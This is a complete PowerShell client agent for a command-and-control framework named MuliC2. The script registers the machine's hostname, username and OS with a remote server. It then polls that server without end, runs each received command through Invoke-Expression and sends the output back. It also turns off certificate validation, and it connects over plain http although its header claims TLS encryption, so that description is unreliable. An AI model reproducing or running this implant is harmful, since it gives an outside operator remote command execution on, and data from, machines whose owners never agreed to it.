<#
.SYNOPSIS
    MuliC2 Agent - PowerShell client for MuliC2 Command & Control framework
    
.DESCRIPTION
    This script registers with a MuliC2 server and polls for tasks to execute.
    All communication is encrypted with TLS 1.3/1.2.
    
.PARAMETER ServerHost
    The IP address or hostname of the MuliC2 server
    
.PARAMETER ApiPort
    The API port of the MuliC2 server (default: 8080)
    
.PARAMETER ProfileId
    The C2 listener profile ID to connect to (default: "default")
    
.PARAMETER PollSeconds
    How often to poll for new tasks in seconds (default: 5)
    
.EXAMPLE
    .\Start-MuliAgent.ps1 -ServerHost 192.168.1.100 -ApiPort 8080 -ProfileId default -PollSeconds 5
    
.NOTES
    This agent requires TLS certificates to be properly configured on the server.
    The agent will automatically register and begin polling for tasks.
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$ServerHost,
    
    [Parameter(Mandatory=$false)]
    [int]$ApiPort = 8080,
    
    [Parameter(Mandatory=$false)]
    [string]$ProfileId = "default",
    
    [Parameter(Mandatory=$false)]
    [int]$PollSeconds = 5
)

# Configure TLS
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls13 -bor [System.Net.SecurityProtocolType]::Tls12
} catch {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[System.Net.ServicePointManager]::CheckCertificateRevocationList = $false

$baseUrl = "http://$ServerHost`:$ApiPort/api/agent"
$jsonHeaders = @{ 'Content-Type' = 'application/json' }

Write-Host "[+] MuliC2 Agent Starting..." -ForegroundColor Green
Write-Host "[*] Server: $ServerHost`:$ApiPort" -ForegroundColor Yellow
Write-Host "[*] Profile: $ProfileId" -ForegroundColor Yellow
Write-Host "[*] Poll Interval: $PollSeconds seconds" -ForegroundColor Yellow

# Registration payload
$regBody = [pscustomobject]@{
    hostname  = $env:COMPUTERNAME
    username  = $env:USERNAME
    ip        = ""
    os        = ((Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Caption) -join '')
    arch      = $env:PROCESSOR_ARCHITECTURE
    profileId = $ProfileId
} | ConvertTo-Json -Compress

Write-Host "[*] Registering with server..." -ForegroundColor Yellow

try {
    $regResp = Invoke-RestMethod -Method POST -Uri "$baseUrl/register" -Headers $jsonHeaders -Body $regBody -TimeoutSec 10
    $agentId = $regResp.agentId
    if (-not $agentId) { throw "registration failed" }
    
    Write-Host "[+] Successfully registered as Agent ID: $agentId" -ForegroundColor Green
} catch {
    Write-Host "[!] Agent registration failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Make sure the server is running and accessible" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Starting task polling loop..." -ForegroundColor Green
Write-Host "[*] Press Ctrl+C to stop the agent" -ForegroundColor Yellow

# Main polling loop
while ($true) {
    try {
        # Fetch tasks
        $tasksResp = Invoke-RestMethod -Method GET -Uri "$baseUrl/tasks?agentId=$agentId" -TimeoutSec 10
        $tasks = $tasksResp.tasks
        
        if ($tasks -and $tasks.Count -gt 0) {
            Write-Host "[*] Received $($tasks.Count) task(s)" -ForegroundColor Cyan
            
            foreach ($task in $tasks) {
                Write-Host "[*] Executing task $($task.id): $($task.command)" -ForegroundColor Yellow
                
                $output = ""
                try {
                    $output = (Invoke-Expression $task.command 2>&1 | Out-String)
                    Write-Host "[+] Task completed successfully" -ForegroundColor Green
                } catch {
                    $output = "ERROR: $($_.Exception.Message)"
                    Write-Host "[!] Task failed: $($_.Exception.Message)" -ForegroundColor Red
                }
                
                # Submit result
                $resBody = @{ taskId = [int]$task.id; output = $output } | ConvertTo-Json -Compress
                try {
                    Invoke-RestMethod -Method POST -Uri "$baseUrl/result" -Headers $jsonHeaders -Body $resBody -TimeoutSec 15 | Out-Null
                    Write-Host "[+] Result submitted successfully" -ForegroundColor Green
                } catch {
                    Write-Host "[!] Failed to submit result: $($_.Exception.Message)" -ForegroundColor Red
                }
            }
        }
    } catch {
        Write-Host "[!] Polling error: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "[*] Retrying in $PollSeconds seconds..." -ForegroundColor Yellow
    }
    
    Start-Sleep -Seconds $PollSeconds
}
